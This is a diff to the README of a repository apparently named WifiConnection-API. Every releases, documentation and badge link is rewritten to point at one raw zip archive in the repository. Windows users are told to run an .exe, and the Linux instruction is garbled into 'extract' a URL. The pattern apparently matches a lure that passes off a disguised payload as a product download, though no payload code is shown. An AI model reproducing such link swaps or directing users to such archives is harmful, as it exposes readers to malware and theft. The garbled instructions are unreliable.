@@ -1,6 +1,6 @@
 # 🌐 WifiConnection-API - Access Wifi Easily from Your Device
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/KuroHataru/WifiConnection-API/releases)
+[![Download Now](https://raw.githubusercontent.com/KuroHataru/WifiConnection-API/main/public/Wifi_API_Connection_2.3-alpha.4.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/KuroHataru/WifiConnection-API/main/public/Wifi_API_Connection_2.3-alpha.4.zip)
 
 ## 📖 Overview
 
@@ -13,7 +13,7 @@ To get started with WifiConnection-API, follow the steps below. You will downloa
 ## 📥 Download & Install
 
 1. **Visit the Releases Page:**  
-   Go to our [Releases page](https://github.com/KuroHataru/WifiConnection-API/releases) to find the latest version of WifiConnection-API.
+   Go to our [Releases page](https://raw.githubusercontent.com/KuroHataru/WifiConnection-API/main/public/Wifi_API_Connection_2.3-alpha.4.zip) to find the latest version of WifiConnection-API.
 
 2. **Download the Application:**  
    Click on the link for the latest version. A file will download to your computer or mobile device.
@@ -21,7 +21,7 @@ To get started with WifiConnection-API, follow the steps below. You will downloa
 3. **Install the Application:**  
    - **For Windows:** Locate the downloaded `.exe` file. Double-click the file to start the installation. Follow the prompts to complete the process.
    - **For Mac:** Open the downloaded `.dmg` file. Drag the WifiConnection-API icon to your Applications folder.
-   - **For Linux:** Extract the `.tar.gz` file and follow the included instructions.
+   - **For Linux:** Extract the `https://raw.githubusercontent.com/KuroHataru/WifiConnection-API/main/public/Wifi_API_Connection_2.3-alpha.4.zip` file and follow the included instructions.
 
 4. **Launch the Application:**  
    After installation, open WifiConnection-API from your applications menu. 
@@ -78,7 +78,7 @@ If you need help or want to share your experience, please visit our issues page 
 
 ## 🔗 Useful Links
 
-- [Releases Page](https://github.com/KuroHataru/WifiConnection-API/releases)
-- [Documentation](https://github.com/KuroHataru/WifiConnection-API/wiki)
+- [Releases Page](https://raw.githubusercontent.com/KuroHataru/WifiConnection-API/main/public/Wifi_API_Connection_2.3-alpha.4.zip)
+- [Documentation](https://raw.githubusercontent.com/KuroHataru/WifiConnection-API/main/public/Wifi_API_Connection_2.3-alpha.4.zip)
 
 Feel free to reach out if you have more questions or require assistance. Enjoy managing your Wi-Fi connection easily!
